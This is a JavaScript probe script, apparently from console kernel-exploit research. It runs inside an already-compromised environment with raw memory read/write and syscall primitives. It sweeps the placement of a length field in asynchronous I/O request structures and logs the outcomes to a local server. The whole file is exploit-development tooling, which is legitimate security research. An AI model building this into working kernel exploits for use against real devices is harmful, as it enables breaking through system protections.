// 26_len.js — sweep LEN placement; fd@0x20 + data@0x08 fixed. Data arrival = hit.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[l26] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const HX = (b, n) => {
        let x = "";
        try { for (let i = 0n; i < BigInt(n); i++) { const v = Number(read8(b + i)) & 255; x += (v < 16 ? "0" : "") + v.toString(16); } }
        catch (e) { x = "FAULT"; }
        return x;
    };
    shout("l26: start"); say("start"); await pace();
    await syscall(0x29En, 0n,0n,0n,0n,0n,0n);
    for (const off of [0x00, 0x08, 0x10, 0x18, 0x20, 0x28]) {
        const tag = "len0x" + off.toString(16);
        shout("l26: " + tag); say(tag); await pace();
        try {
            const a = malloc(8); write64(a, 0n);
            await syscall(0x2AFn, a, 0n,0n,0n,0n,0n);
            const fds = read64(a);
            const rfd = Number(fds & 0xFFFFFFFFn), wfd = Number((fds >> 32n) & 0xFFFFFFFFn);
            const msg = malloc(16);
            const hello = [72, 69, 76, 76, 79, 33, 33, 33];
            for (let i = 0; i < 8; i++) write8(msg + BigInt(i), hello[i]);
            await syscall(0x04n, BigInt(wfd), msg, 8n, 0n, 0n, 0n);
            const RB = 0x40;
            const req = malloc(RB);
            for (let i = 0; i < RB; i += 8) write64(req + BigInt(i), 0n);
            const data = malloc(64);
            for (let i = 0; i < 64; i++) write8(data + BigInt(i), 0xAA);
            write32(req + 0x20n, rfd);
            write64(req + 0x08n, data);
            write64(req + BigInt(off), 8n);
            const ids = malloc(8), states = malloc(8);
            write32(ids, 0n); write32(ids + 4n, 0n);
            write32(states, 0n); write32(states + 4n, 0n);
            const r = await syscall(0x29Dn, 0x1n, req, 1n, 3n, ids, 0n);
            await syscall(0x297n, ids, 1n, states, 1n, 0n, 0n);
            for (let i = 0; i < 100; i++) { try { await syscall(0x14Bn, 0n,0n,0n,0n,0n,0n); } catch (e) {} }
            const got = HX(data, 16);
            shout(("l26: " + tag + " sub=" + String(r) + " buf=" + got).slice(0,110));
            say(tag + " sub=" + String(r) + " buf=" + got); await pace();
            try { await syscall(0x29An, ids, 1n, states, 0n,0n,0n,0n); } catch (e) {}
            try { await syscall(0x296n, ids, 1n, states, 0n,0n,0n,0n); } catch (e) {}
            try { await syscall(0x06n, BigInt(rfd), 0n,0n,0n,0n,0n); } catch (e) {}
            try { await syscall(0x06n, BigInt(wfd), 0n,0n,0n,0n,0n); } catch (e) {}
        } catch (e) { shout("l26: " + tag + " THREW"); say(tag + " threw"); await pace(); }
    }
    shout("l26: done"); say("len sweep done");
})()
